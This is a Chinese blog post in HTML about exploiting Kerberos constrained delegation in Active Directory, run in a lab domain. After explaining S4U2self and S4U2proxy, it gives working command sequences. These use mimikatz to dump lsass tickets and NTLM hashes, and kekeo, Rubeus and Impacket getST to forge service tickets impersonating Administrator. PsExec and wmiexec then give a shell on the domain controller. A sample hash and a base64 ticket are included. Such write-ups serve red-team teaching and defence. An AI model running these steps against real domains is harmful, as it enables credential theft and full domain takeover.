@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="概念Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议S4u2self（Service for User to Self）和S4U2proxy（Service for User to Proxy）。约束委派有两种：   仅使用Kerberos，不能进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="约束性委派利用">
+<meta property="og:url" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="概念Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议S4u2self（Service for User to Self）和S4U2proxy（Service for User to Proxy）。约束委派有两种：   仅使用Kerberos，不能进">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/1.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/2.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/3.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/4.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/5.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/6.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/7.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/8.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/9.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/10.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/11.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/12.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/13.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/14.png">
+<meta property="og:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/15.png">
+<meta property="article:published_time" content="2023-02-24T07:41:31.000Z">
+<meta property="article:modified_time" content="2023-02-24T08:55:53.197Z">
+<meta property="article:author" content="ChenZIDu">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/1.png">
+
+<link rel="canonical" href="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>约束性委派利用 | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Chen'Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          约束性委派利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-02-24 15:41:31 / 修改时间：16:55:53" itemprop="dateCreated datePublished" datetime="2023-02-24T15:41:31+08:00">2023-02-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%A7%94%E6%B4%BE/" itemprop="url" rel="index">
+                    <span itemprop="name">委派</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">1.7k(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">7(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2023/02/24/%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Widnows Server 2003 之后微软引入了非约束委派。同时，为了顺利进行约束性委派，微软于2007年为 Kerberos 协议的 TGS_REQ 和 TGS_REP 阶段引入了两个扩展协议<code>S4u2self（Service for User to Self）</code>和<code>S4U2proxy（Service for User to Proxy）</code>。<br>约束委派有两种：</p>
+<blockquote>
+<ol>
+<li>仅使用Kerberos，不能进行协议转换</li>
+<li>使用任何身份验证协议</li>
+</ol>
+</blockquote>
+<a id="more"></a>
+
+<h3 id="S4u2self-amp-S4U2proxy"><a href="#S4u2self-amp-S4U2proxy" class="headerlink" title="S4u2self &amp; S4U2proxy"></a>S4u2self &amp; S4U2proxy</h3><p><code>S4U2self</code>协议允许服务代表任意用户请求访问自身服务的ST服务票据；<br><code>S4U2proxy</code>协议允许服务在已取得ST服务票据下代表任意用户获取另一个服务的服务票据；<br>    约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问<strong>特定</strong>的其他服务。<br>配置了约束性委派的账户属性会有如下两个变化：</p>
+<blockquote>
+<ol>
+<li>账户<code>userAccountControl</code>属性设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>标志位，值<code>16781312</code>。</li>
+<li>账户<code>msDS-AllowedToDelegateTo</code>属性，添加允许委派的服务。</li>
+</ol>
+</blockquote>
+<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">域名: redteam.com</span><br><span class="line">域控: </span><br><span class="line">    操作系统: Windows<span class="built_in"> Server </span>2016</span><br><span class="line">		主机名: ad02-2016</span><br><span class="line">    IP: 10.10.1.10</span><br><span class="line"></span><br><span class="line">    主机名: ad02-2016</span><br><span class="line">    IP: 10.10.1.11</span><br><span class="line">域内主机:</span><br><span class="line">    操作系统: Windows<span class="built_in"> server </span>2012</span><br><span class="line">    主机名: web-2012</span><br><span class="line">    IP: 10.10.10.12</span><br><span class="line">攻击机:</span><br><span class="line">    操作系统: win 10</span><br><span class="line">    IP: 10.10.10.22</span><br></pre></td></tr></table></figure>
+<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p><strong>机器账户</strong><br>活动目录中的computers组内的计算机，也被称为机器账号。<br><strong>服务账户</strong><br>域账户注册SPN成为服务账户</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A cifs/web<span class="number">-2012.</span>redteam.red saulgoodman #saulgoodman为用户名</span><br><span class="line">setspn -U -A cifs/web<span class="number">-2012.</span>redteam.red web<span class="number">-2012</span> #web<span class="number">-2012</span>为主机名</span><br><span class="line"></span><br><span class="line">#取消注册</span><br><span class="line">setspn -D cifs/web<span class="number">-2012.</span>redteam.red</span><br></pre></td></tr></table></figure>
+<p>域账户变成服务账户后会有委派，仅信任此用户作为指定服务的委派 -&gt; 添加想要委派的服务。</p>
+<p><img src="1.png" alt="image.png"></p>
+<h2 id="约束委派服务账户特征"><a href="#约束委派服务账户特征" class="headerlink" title="约束委派服务账户特征"></a><strong>约束委派服务账户特征</strong></h2><p> 配置了约束性委派的账户属性会有如下两个变化。<br>账户 userAccountControl 属性会被设置为TRUSTED_TO_AUTH_FOR_DELEGATION 标志位，账户 msDS-AllowedToDelegateTo 属性，添加允许委派的服务。<br><img src="2.png" alt="image.png"></p>
+<h2 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h2><h4 id="方法1：ADFind"><a href="#方法1：ADFind" class="headerlink" title="方法1：ADFind"></a>方法1：ADFind</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># <span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe查询约束委派机器账户</span><br><span class="line">.\<span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe -b <span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"># <span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe查询约束委派服务账户</span><br><span class="line">.\<span class="module-access"><span class="module"><span class="identifier">AdFind</span>.</span></span>exe -b <span class="string">"DC=redteam,DC=com"</span> -f <span class="string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+<p><img src="3.png" alt="image.png"></p>
+<h4 id="方法2：SharpView"><a href="#方法2：SharpView" class="headerlink" title="方法2：SharpView"></a>方法2：SharpView</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PowerView查询约束委派机器账户</span></span><br><span class="line">.\<span class="keyword">sharpview.exe </span>Get-DomainComputer -TrustedToAuth -Doamin redteam.com -Properties <span class="keyword">distinguishedname,useraccountcontrol,msds-allowedtodelegateto </span>-AutoSize</span><br><span class="line"></span><br><span class="line"><span class="comment"># PowerView查询约束委派服务账户</span></span><br><span class="line">.\<span class="keyword">sharpview.exe </span>Get-DomainUser –TrustedToAuth -Domain redteam.com -Properties <span class="keyword">distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl</span></span><br></pre></td></tr></table></figure>
+<p><img src="4.png" alt="image.png"></p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><h3 id="机器账户"><a href="#机器账户" class="headerlink" title="机器账户"></a>机器账户</h3><h4 id="方法1：使用机器账户的票据-kekeo"><a href="#方法1：使用机器账户的票据-kekeo" class="headerlink" title="方法1：使用机器账户的票据 | kekeo"></a>方法1：使用机器账户的票据 | kekeo</h4><p>约束性委派攻击的关键就是<strong>获得可转发的服务票据ST</strong>，获取根据约束性委派的执行过程可知，只要<strong>控制配置约束性委派服务的机器，并获得了它的密码</strong>，那么我们就可以劫持这台主机的kerberos请求过程，最终获得任意用户权限的ticket，利用条件：</p>
+<blockquote>
+<ol>
+<li>需要Administrator权限</li>
+<li>目标机器账户配置了约束性委派</li>
+</ol>
+</blockquote>
+<p>使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>工具导出<code>lsass.exe</code>进程中所有的票据，得到想要的服务票据</p>
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 导出票据</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::tickets /export"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
+<p><img src="5.png" alt="image.png"></p>
+<p>使用kekeo工具申请服务票据（S4U2Proxy协议）</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 申请服务票据</span></span><br><span class="line">.<span class="string">\kekeo.exe</span> <span class="string">"tgs::s4u /tgt:[0;3e7]-2-1-40e10000-web-2012$@krbtgt-REDTEAM.COM.kirbi /user:Administrator@redteam.COM /service:cifs/ad01-2016.redteam.com"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入票据</span></span><br><span class="line">.<span class="string">\mimikatz.exe</span> <span class="string">"kerberos::ptt TGS_Administrator@redteam.com@REDTEAM.COM_cifs~ad01-2016.redteam.com@REDTEAM.com.kirbi"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问</span></span><br><span class="line">dir <span class="string">\\ad01-2016.redteam.com\c$</span></span><br><span class="line"></span><br><span class="line">.<span class="string">\Psexec.exe</span> -accepteula <span class="string">\\ad01-2016.redteam.red</span> cmd</span><br></pre></td></tr></table></figure>
+<h4 id="方法2：使用机器账户的Hash值-Rubeus"><a href="#方法2：使用机器账户的Hash值-Rubeus" class="headerlink" title="方法2：使用机器账户的Hash值 | Rubeus"></a>方法2：使用机器账户的Hash值 | Rubeus</h4><p>与思路一类似，但是这里使用的是Hash值，利用条件：</p>
+<blockquote>
+<ol>
+<li>需要Administrator权限</li>
+<li>目标机器账户配置了约束性委派</li>
+</ol>
+</blockquote>
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 使用mimikatz获取机器账户NTLM Hash</span></span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
+<p>使用<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>申请访问自身的可转发服务票据</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 使用Rubeus申请配置了约束委派机器账户web<span class="number">-2012</span>$的TGT</span><br><span class="line">.\Rubeus.exe asktgt /user:WEB<span class="number">-2012</span>$ /rc4:<span class="number">40</span>ee25b2c3f7ac3370429b18aca51e81 /domain:redteam.red /dc:ad02<span class="number">-2016.</span>redteam.red /nowrap</span><br><span class="line"></span><br><span class="line"># 使用Rubeus通过S4U2Self协议代表域管理员Administrator请求针对域控LDAP服务的票据，并注入内存</span><br><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:ldap/ad02<span class="number">-2016.</span>redteam.red /dc:ad02<span class="number">-2016.</span>redteam.red /ptt /ticket:doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQ0bC1JFRFRFQU0uUkVEoiAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLnJlZKOCA88wggPLoAMCARKhAwIBAqKCA70EggO5H/WWv61D37Lh8CgUrZXK+OCIcG1ppRSAswcwQuaD4XOCz+v9+wZRJ6xY1DRAQ7HK0fIrp96Z54o0al1nMCGXkKRrq4+UyiTuDABdCUxj/bKj0m/DanX6Bm82LFah0J8CRpFsbt5i1F0U/<span class="number">0</span>t79e8lGbWqmTajaeTgYQrLFmWMUTL8+DQ7E02wth14UY/rBBF/oDwdVhoFovwvkjSiLYx3ePyX20Gmz8IH+<span class="number">1</span>ReqZajI8I4FGn1fV6FSzlUI7eWMumOkV61iV3uW1Zw7OqawRTcbx/<span class="number">33</span>rBjkpKsBCY0Gx41q63a8HiLua1tJZkJOERmUWjr/<span class="number">7</span>EZeZ+RbcgvDT3yOGD1L0y2iHTnGk1+maS3Rbee7EtERg4RmSwXUMnoRsle6/oVFyVdGhpbf8ePiCUY1IQCLNIt7YcleNljrOxSZwPIH1lBwIxiRNrgyhnJbcFKhroZg+dbITKaZYP1j1jcOdlpA2t5qF/kgIcuTSyz7E8bMvm+<span class="number">34</span>TwLjOF+bw+<span class="number">5</span>O3riugezUL0nhZRxxZGYfixtOLTN+wxLfDOvqzBbE9HOSJJOeoxGsktl8y5ULQ1cSxEyYjklxlMrv8/t2jJKJE60VrJS+f+VhYw0de+<span class="number">6</span>AJ08aSWJrfAQQ6T9aAyBFr+flOnx93aIYb5ql6W5rZ9Q5OKDcms/<span class="number">1</span>rIzVDoPdB2ZAQxPkquHB8vFAXO86rKw1k1SauMxn8sOFVdocF56eWHIEUegVe4mpGLipQMTMJnFCGhuq1IlLZbPTnFykDM9cR+FZb3d5uUN45BGIS2TEKtie6yBROP5mX3F6273srlBM/XOgOUXPnradx1RUPJ2zEM9L8PYKKm516wTJLirmAYRI4FSdQ3hHuMLeTrHNE8BggLf1AhTQizCf7iUJFf7hJv09gIugLFNXtqakKFeAnxz7Ej+X9Q3xyaR39IBIKPrtd/ChkbDZYiID9n31sGQ4oTyYEQDoef4zIhq/x3qRxeroCFKG4yRdVKo8eBEq4a5TPuHIbstXO<span class="comment">//3ZAcxFmK8Kcs+PHbkgyDyGiLdhf2GjnGDtBL1Hj4nJHVCXZR49XNhpCKY2iG/JkVq0RFoxn1X06BY7WcMQybIoXeD0jjXrEQn7Qh6xe6SsRsu5YU0npq8TBEcI6F3wtzGZX9KMLnHIRRfcsBlCLi5LOgIl/byAkR/ImxzlhVi/TxDn1p3kDOj+qHzcayOm0SBzr4kES/T6DCsoSCaeAYUzR5CSn4hnEtTzoTJGmAgR602Hp2HymQSfjlQQk9rqPiZCGLg7i+3GjgdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCrZ+acKyJr6OeDK5YKeYM0oQ0bC1JFRFRFQU0uUkVEohYwFKADAgEBoQ0wCxsJV0VCLTIwMTIkowcDBQBA4QAApREYDzIwMjMwMjA3MDgzOTM4WqYRGA8yMDIzMDIwNzE4MzkzOFqnERgPMjAyMzAyMTQwODM5MzhaqA0bC1JFRFRFQU0uUkVEqSAwHqADAgECoRcwFRsGa3JidGd0GwtyZWR0ZWFtLnJlZA==</span></span><br><span class="line"></span><br><span class="line"># 直接dir</span><br><span class="line">dir \\ad02<span class="number">-2016.</span>redteam.red\c$</span><br></pre></td></tr></table></figure>
+<p><img src="6.png" alt="image.png"></p>
+<h4 id="方法3：使用机器账户的Hash值-getST"><a href="#方法3：使用机器账户的Hash值-getST" class="headerlink" title="方法3：使用机器账户的Hash值 | getST"></a>方法3：使用机器账户的Hash值 | getST</h4><p>同思路2一致，也是使用机器账户的Hash值，但这里使用Impacket工具套件中的<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py" target="_blank" rel="noopener">getST.py</a>脚本请求服务票据，并利用该脚本通过<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a>工具远程登录<br>利用条件：</p>
+<ol>
+<li>需要Administrator权限</li>
+<li>目标机器账户配置了约束性委派<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz获取机器账户NTLM Hash值</span><br><span class="line">mimikatz.<span class="keyword">exe</span> <span class="string">"privilege::debug"</span> <span class="string">"sekurlsa::logonpasswords"</span> <span class="string">"exit"</span></span><br><span class="line"></span><br><span class="line"># 使用getST申请服务票据</span><br><span class="line">.\getST.<span class="keyword">exe</span> -dc-ip <span class="number">10.10</span>.<span class="number">10.10</span> -spn cifs/ad01-<span class="number">2016</span>.redteam.<span class="keyword">com</span> -impersonate administrator redteam.<span class="keyword">com</span>/web-<span class="number">2012</span>$ -hashes :<span class="number">1</span>d01ff5cd4825306ff1a7599204525ec</span><br><span class="line"></span><br><span class="line"># 使用票据远程访问</span><br><span class="line"><span class="keyword">set</span> KRB5CCNAME=administrator.ccache </span><br><span class="line">.\wmiexec.<span class="keyword">exe</span> -<span class="keyword">k</span> redteam.<span class="keyword">com</span>/administrator@ad01-<span class="number">2016</span>.redteam.<span class="keyword">com</span> -<span class="keyword">no</span>-pass -dc-ip <span class="number">10.10</span>.<span class="number">10.10</span> -codec gbk</span><br></pre></td></tr></table></figure>
+<img src="7.png" alt="image.png"></li>
+</ol>
